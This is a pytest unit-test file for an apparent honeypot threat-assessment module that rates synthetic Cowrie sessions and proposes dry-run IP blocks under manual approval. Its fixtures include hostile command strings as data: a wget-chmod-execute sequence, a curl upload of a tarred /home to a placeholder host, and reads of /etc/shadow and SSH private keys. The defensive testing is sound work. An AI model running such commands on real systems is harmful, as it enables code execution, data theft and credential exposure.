"""Unit tests for threat_assessment (Task 24). Synthetic Cowrie-style events -> unchanged behavioural_evidence -> assessment.

Fixture sources use RFC 5737 documentation addresses as stand-ins for an internet client (test data, not lab
identities). No dataset, test-set or network access; nothing is executed.
"""
import copy
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from behavioural_evidence import EvidenceConfig, EvidenceEngine
from behavioural_evidence.calibration import SensorCalibration
from threat_assessment import (AssessmentConfigError, AttributionConfig, AuditLog, PolicyConfig, ThreatAssessor, load_attribution_config,
                               load_policy, verify_chain)
from threat_assessment.config import canonical_digest
from threat_assessment.severity import credential_severity

REPO = Path(__file__).resolve().parents[1]
T0 = datetime(2026, 11, 10, 10, 0, 0, tzinfo=timezone.utc)
CLIENT = "203.0.113.50"
RELAY = "172.22.0.2"

ATT_DOC = {"schema": "threat-attribution-config-1", "config_version": "test-1", "source_field": "src_ip",
           "trusted_proxy_cidrs": ["172.22.0.2/32"], "relay_addresses": [RELAY], "proxy_client_mapping": None,
           "shared_source_cidrs": ["198.51.100.0/24"], "protected_cidrs": ["127.0.0.0/8", "172.22.0.0/16", "192.0.2.0/28"],
           "internal_cidrs": ["10.0.0.0/8"]}


def policy_doc(att_doc=ATT_DOC, **over):
    doc = json.loads((REPO / "configs" / "defence_policy_v2.json").read_text(encoding="utf-8"))
    doc["attribution_config"]["sha256_digest"] = canonical_digest(att_doc)
    for k, v in over.items():
        doc[k] = v
    return doc


ECFG = EvidenceConfig(relay_sources=frozenset({RELAY}), internal_networks=("10.0.0.0/8",))


def ev(sid, eventid, t, src, **f):
    e = {"eventid": eventid, "session": sid, "timestamp": (T0 + timedelta(seconds=t)).isoformat().replace("+00:00", "Z"), **f}
    if src is not None:
        e["src_ip"] = src
    return e


def session(sid, lines=(), src=CLIENT, t0=0.0, fail=0, login=True, downloads=(), uploads=(), gap=1.0):
    out = [ev(sid, "cowrie.session.connect", t0, src)]
    t = t0 + 0.1
    for k in range(fail):
        out.append(ev(sid, "cowrie.login.failed", t, src, username="root", password=f"p{k}"))
        t += 0.1
    if login:
        out.append(ev(sid, "cowrie.login.success", t, src, username="root", password="ok"))
        for ln in lines:
            t += gap
            out.append(ev(sid, "cowrie.command.input", t, src, input=ln))
        for d in downloads:
            out.append(ev(sid, "cowrie.session.file_download", t + 0.1, src, url=d, shasum="ab"))
        for u in uploads:
            out.append(ev(sid, "cowrie.session.file_upload", t + 0.1, src, filename=u, shasum="cd"))
    out.append(ev(sid, "cowrie.session.closed", t + 0.5, src, duration="1.0"))
    return out


def records(events, ecfg=ECFG, novelty=None):
    return {r["session_ref"]: r for r in EvidenceEngine(ecfg).evaluate(events, novelty=novelty)["sessions"]}


def assessor(att_doc=ATT_DOC, pol=None, ecfg=ECFG):
    return ThreatAssessor(AttributionConfig.from_document(att_doc), PolicyConfig.from_document(pol or policy_doc(att_doc)), ecfg)


PROPOSE_LINES = ["wget http://h.example/x.sh -O x.sh", "chmod +x x.sh", "./x.sh"]


def propose_record():
    return records(session("p", PROPOSE_LINES))["p"]


# --------------------------------------------------------------------------------------------------------- tiers
def test_four_tiers():
    a = assessor()
    recs = records(session("ab", []) + session("rec", ["w", "uname -a"], t0=10) + session("rev", ["wget http://h.example/a"], t0=20)
                   + session("p", PROPOSE_LINES, t0=30))
    tiers = {k: a.assess(v)["tier"] for k, v in recs.items()}
    assert tiers == {"ab": "abstain", "rec": "record", "rev": "review", "p": "propose"}


def test_s1_only_is_record():
    ev_ = sum((session(f"f{k}", [], t0=k * 10, fail=1, login=False) for k in range(3)), [])
    r = records(ev_)
    out = assessor().assess(r["f0"])
    assert out["tier"] == "record" and [f["severity"] for f in out["findings"]] == ["S1"]


def test_proposal_requires_manual_approval_and_records_inverse_without_execution():
    out = assessor().assess(propose_record())
    p = out["proposed_action"]
    assert p["manual_approval"] == "pending" and p["execution"] == "not_executed" and p["mode"] == "dry_run"
    assert p["inverse"] == {"type": "unblock_source_ip", "subject": CLIENT} and p["subject"] == CLIENT


# ------------------------------------------------------------------------------------ each condition independently
def _gates_failing(out):
    return sorted(k for k, v in out["gates"].items() if not v)


def test_gate1_severity():
    r = propose_record()
    r["interpretations"] = [dict(i, name="repeated authentication failures") for i in r["interpretations"]]
    out = assessor().assess(r)
    assert out["tier"] != "propose" and "1_severity_S2_or_higher" in _gates_failing(out)


def test_gate2_interpretation_level():
    r = propose_record()
    for i in r["interpretations"]:
        i["evidence_level"] = "E1"
    r["evidence_level"] = "E2"                                   # session level must not be substituted
    out = assessor().assess(r)
    assert out["tier"] == "review" and "2_interpretation_E2_or_higher_on_an_S2plus_finding" in _gates_failing(out)


def test_gate3_distinct_action_indicators():
    r = propose_record()
    for i in r["interpretations"]:
        i["supporting_action_indicators"] = ["XFER-1"]
    out = assessor().assess(r)
    assert _gates_failing(out) == ["3_two_distinct_action_indicators"] and out["tier"] == "review"


def test_gate4_successful_login():
    r = propose_record()
    r["n_input_lines"] = 0
    r["authentication_status"] = "below_threshold"
    out = assessor().assess(r)
    assert _gates_failing(out) == ["4_successful_login"] and out["tier"] == "review"


def test_gate5_attribution_relay():
    r = records(session("p", PROPOSE_LINES, src=RELAY))["p"]
    out = assessor().assess(r)
    assert "5_attributable_source" in _gates_failing(out) and out["tier"] == "review"
    assert out["findings"][0]["attribution"]["state"] == "unattributed:trusted_proxy"


@pytest.mark.parametrize("src,state", [("198.51.100.7", "shared_source"), ("192.0.2.3", "protected")])
def test_gate6_protected_or_shared(src, state):
    out = assessor().assess(records(session("p", PROPOSE_LINES, src=src))["p"])
    assert out["session_attribution"]["state"] == state and "6_not_protected_or_shared" in _gates_failing(out) and out["tier"] == "review"


def test_gate7_wrong_evidence_digest():
    r = propose_record()
    r["config_digest"] = "0" * 16
    out = assessor().assess(r)
    assert _gates_failing(out) == ["7_verified_configuration_digests"] and out["tier"] == "review"


def test_gate7_policy_pin_mismatch():
    pol = policy_doc()
    pol["attribution_config"]["sha256_digest"] = "f" * 64
    out = assessor(pol=pol).assess(propose_record())
    assert "7_verified_configuration_digests" in _gates_failing(out) and out["tier"] == "review"


def test_gate7_network_scope_mismatch():
    ecfg = EvidenceConfig(relay_sources=frozenset({RELAY}))       # package default internal networks (implicit)
    out = assessor(ecfg=ecfg).assess(records(session("p", PROPOSE_LINES), ecfg=ecfg)["p"])
    assert "7_verified_configuration_digests" in _gates_failing(out)
    assert out["versions"]["configuration_checks"]["evidence_internal_networks_equal_explicit_config"] is False


def test_gate8_processing_error_abstains():
    r = propose_record()
    del r["indicators"]
    out = assessor().assess(r)
    assert out["tier"] == "abstain" and out["processing_errors"] and out["proposed_action"] is None


def test_unsupported_catalogue_in_record_abstains():
    r = propose_record()
    r["catalogue_version"] = "v1-legacy"
    assert assessor().assess(r)["tier"] == "abstain"


# ---------------------------------------------------------------------------------------------------- attribution
def test_missing_and_invalid_source():
    r = propose_record()
    r["src_ip"] = None
    out = assessor().assess(r)
    assert out["session_attribution"]["state"] == "unattributed:no_source" and out["tier"] != "propose"
    r["src_ip"] = "not-an-ip"
    assert assessor().assess(r)["session_attribution"]["state"] == "unattributed:invalid_source"


def test_untrusted_forwarded_headers_are_ignored():
    r = records(session("p", PROPOSE_LINES, src=RELAY))["p"]
    r["x_forwarded_for"] = CLIENT
    r["client_ip"] = CLIENT
    out = assessor().assess(r)
    assert out["session_attribution"]["state"] == "unattributed:trusted_proxy"
    assert out["session_attribution"]["ignored_untrusted_fields"] == ["client_ip", "x_forwarded_for"] and out["tier"] != "propose"


def test_attribution_applied_to_every_finding():
    out = assessor().assess(records(session("p", PROPOSE_LINES, src=RELAY))["p"])
    assert out["findings"] and all(f["attribution"]["state"] == "unattributed:trusted_proxy" for f in out["findings"])


# --------------------------------------------------------------------------------------------- configuration safety
@pytest.mark.parametrize("change", [{"internal_cidrs": []}, {"proxy_client_mapping": {"file": "x"}}, {"source_field": "x_forwarded_for"},
                                    {"schema": "other"}, {"protected_cidrs": ["300.0.0.0/8"]}, {"trusted_proxy_cidrs": "172.22.0.2/32"}])
def test_bad_attribution_config_fails(change):
    with pytest.raises(AssessmentConfigError):
        AttributionConfig.from_document({**ATT_DOC, **change})


def test_missing_attribution_key_fails():
    d = dict(ATT_DOC)
    del d["shared_source_cidrs"]
    with pytest.raises(AssessmentConfigError):
        AttributionConfig.from_document(d)


@pytest.mark.parametrize("mut", ["v1", "no_pin", "relax", "enforce", "no_manual", "threshold", "no_inverse"])
def test_bad_policy_fails(mut):
    d = policy_doc()
    if mut == "v1":
        d = json.loads((REPO / "configs" / "defence_policy.json").read_text(encoding="utf-8"))
    elif mut == "no_pin":
        d["attribution_config"].pop("sha256_digest")
    elif mut == "relax":
        d["proposal_conditions"]["require_attributable_source"] = False
    elif mut == "enforce":
        d["enforcement"] = "enabled"
    elif mut == "no_manual":
        d["manual_approval_required"] = False
    elif mut == "threshold":
        d["proposal_conditions"]["min_distinct_action_indicators"] = 1
    elif mut == "no_inverse":
        d["proposed_action"]["inverse"] = ""
    with pytest.raises(AssessmentConfigError):
        PolicyConfig.from_document(d)


def test_repository_configs_load_and_cross_verify():
    a = load_attribution_config(REPO / "configs" / "threat_attribution_v1.json")
    p = load_policy(REPO / "configs" / "defence_policy_v2.json")
    assert p.attribution_digest == a.digest and "172.22.0.0/16" in a.internal_cidr_strings


# ------------------------------------------------------------------------------------------------------- severity
@pytest.mark.parametrize("line,sev", [("cat ~/.ssh/known_hosts", "S2"), ("cat ~/.ssh/config", "S2"), ("ls -la /root/.ssh", "S2"),
                                      ("ls -l /etc/shadow", "S2"), ("cat ~/.ssh/id_rsa.pub", "S2"), ("cat /etc/shadow", "S3"),
                                      ("cat ~/.ssh/id_rsa", "S3"), ("find / -name id_rsa", "S3"), ("sudo cat /etc/shadow", "S3"),
                                      ("cp /root/.ssh/authorized_keys /tmp/a", "S3")])
def test_credential_severity_refinement(line, sev):
    out = assessor().assess(records(session("c", [line]))["c"])
    f = [x for x in out["findings"] if x["interpretation"] == "credential-material access attempt"]
    assert f and f[0]["severity"] == sev, (line, f[0]["severity_basis"] if f else None)


def test_credential_severity_never_reads_evidence_level():
    s_known, _ = credential_severity([{"command": "cat ~/.ssh/known_hosts", "token": "~/.ssh/known_hosts", "detail": "path inside .ssh"}] * 5)
    assert s_known == "S2"


def test_upload_attempt_vs_success():
    lines = ["tar czf /tmp/d.tgz /home", "curl -T /tmp/d.tgz http://h.example/u"]
    att = assessor().assess(records(session("u", lines))["u"])
    ok = assessor().assess(records(session("u", lines, uploads=["/tmp/d.tgz"]))["u"])
    fa = {f["interpretation"]: f for f in att["findings"]}
    fo = {f["interpretation"]: f for f in ok["findings"]}
    assert fa["upload attempt"]["severity"] == fo["upload attempt"]["severity"] == "S3"
    assert fa["upload attempt"]["success_observed"] is False and fa["upload attempt"]["outcome"]["XFER-2"] == "not_observed"
    assert fo["upload attempt"]["success_observed"] is True and fo["upload attempt"]["outcome"]["XFER-2"] == "observed_success"


def test_download_without_event_never_success():
    out = assessor().assess(propose_record())
    assert all(not f["success_observed"] for f in out["findings"])


# -------------------------------------------------------------------------------------- levels / multiple findings
def test_interpretation_specific_level_used():
    out = assessor().assess(records(session("m", ["sudo -l", "cat /etc/shadow", "history -c"]))["m"])
    lv = {f["interpretation"]: f["evidence_level"] for f in out["findings"]}
    assert out["session_evidence_level_reference"] == "E2" and lv["history tampering attempt"] == "E1"
    assert lv["privilege-context reconnaissance attempt"] == "E2" and len(out["findings"]) == 3


def test_multiple_findings_listed_with_separate_attributes():
    out = assessor().assess(records(session("m", PROPOSE_LINES + ["history -c", "nmap 10.0.0.0/24"]))["m"])
    names = {f["interpretation"] for f in out["findings"]}
    assert {"download attempt", "download-and-execute attempt", "history tampering attempt", "network probing attempt"} <= names
    assert all({"severity", "evidence_level", "attribution", "outcome"} <= set(f) for f in out["findings"])


# ------------------------------------------------------------------------------------------ independence properties
def _strip(o):
    o = copy.deepcopy(o)
    o.pop("novelty_annotation", None)
    return o


def test_novelty_independence():
    a = assessor()
    base = a.assess(records(session("p", PROPOSE_LINES))["p"])
    for flag in (True, False):
        nov = a.assess(records(session("p", PROPOSE_LINES), novelty={"p": {"C_flag": flag, "score": 99.0}})["p"])
        assert _strip(nov) == _strip(base) and nov["novelty_annotation"]["used_for_assessment"] is False
    low = a.assess(records(session("w", ["w"]), novelty={"w": {"C_flag": True}})["w"])
    assert low["tier"] == "record"


def test_caveat_independence():
    cal = SensorCalibration(sensor="s", version="1", slow_commands=("find / -name id_rsa 2>/dev/null",), inter_input_gap_reference_p99_s=1.0, source="t")
    lines = ["sudo -l", "find / -name id_rsa 2>/dev/null"]
    e_cal = EvidenceConfig(relay_sources=frozenset({RELAY}), internal_networks=("10.0.0.0/8",), calibration=cal)
    with_cal = assessor(ecfg=e_cal).assess(records(session("k", lines, gap=12.0), ecfg=e_cal)["k"])
    without = assessor().assess(records(session("k", lines, gap=12.0))["k"])
    assert {"ART-1", "TIME-0"} <= set(with_cal["caveat_annotations"])
    assert with_cal["tier"] == without["tier"] and [f["severity"] for f in with_cal["findings"]] == [f["severity"] for f in without["findings"]]
    only_caveats = assessor(ecfg=e_cal).assess(records(session("z", ["find / -name id_rsa 2>/dev/null"], gap=30.0), ecfg=e_cal)["z"])
    assert only_caveats["tier"] != "propose"


def test_single_failed_login_never_triggers():
    out = assessor().assess(records(session("f", [], fail=1, login=False))["f"])
    assert out["tier"] in ("abstain", "record") and out["proposed_action"] is None


def test_evidence_record_not_modified():
    r = propose_record()
    before = json.dumps(r, sort_keys=True)
    assessor().assess(r)
    assert json.dumps(r, sort_keys=True) == before


def test_deterministic_repeated_runs():
    recs = list(records(session("p", PROPOSE_LINES) + session("q", ["cat /etc/shadow", "sudo -l"], t0=50)).values())
    a = [json.dumps(assessor().assess(r), sort_keys=True) for r in recs]
    b = [json.dumps(assessor().assess(r), sort_keys=True) for r in recs]
    assert a == b


# ------------------------------------------------------------------------------------------------------------ audit
def _log(n_extra=2, clock=lambda: "2026-11-11T00:00:00Z"):
    log = AuditLog("t", clock=clock)
    a = assessor()
    log.append(a.assess(propose_record()))
    for k in range(n_extra):
        log.append(a.assess(records(session(f"w{k}", ["w"]))[f"w{k}"]))
    return log


def test_chain_verifies_and_records_inverse():
    log = _log()
    assert verify_chain(log.entries, log.checkpoint())["ok"]
    e = log.entries[0]
    assert e["tier"] == "propose" and e["inverse_operation"]["type"] == "unblock_source_ip" and e["manual_approval_status"] == "pending"
    assert all(x["execution_status"] == "not_executed" for x in log.entries) and log.entries[1]["inverse_operation"] is None
    for k in ("record_id", "previous_hash", "record_hash", "timestamp", "session_ref", "finding_refs", "attribution", "evidence_and_severity",
              "versions", "tier", "proposed_action", "manual_approval_status", "inverse_operation", "execution_status",
              "verification_status", "rollback_status"):
        assert k in e


@pytest.mark.parametrize("attack", ["modify", "delete", "reorder", "insert", "truncate", "execute"])
def test_tamper_detection(attack):
    log = _log()
    ents = copy.deepcopy(log.entries)
    if attack == "modify":
        ents[1]["tier"] = "propose"
    elif attack == "delete":
        del ents[1]
    elif attack == "reorder":
        ents[1], ents[2] = ents[2], ents[1]
    elif attack == "insert":
        ents.insert(1, copy.deepcopy(ents[1]))
    elif attack == "truncate":
        ents = ents[:-1]
    elif attack == "execute":
        ents[0]["execution_status"] = "executed"
        from threat_assessment.audit import entry_hash
        ents[0]["record_hash"] = entry_hash(ents[0])
    assert not verify_chain(ents, log.checkpoint())["ok"]


def test_audit_deterministic_with_fixed_clock_and_refuses_overwrite(tmp_path):
    a, b = _log(), _log()
    assert [e["record_hash"] for e in a.entries] == [e["record_hash"] for e in b.entries]
    p = tmp_path / "audit.jsonl"
    log = AuditLog("t", path=p, clock=lambda: "x")
    log.append(assessor().assess(propose_record()))
    with pytest.raises(FileExistsError):
        AuditLog("t", path=p)
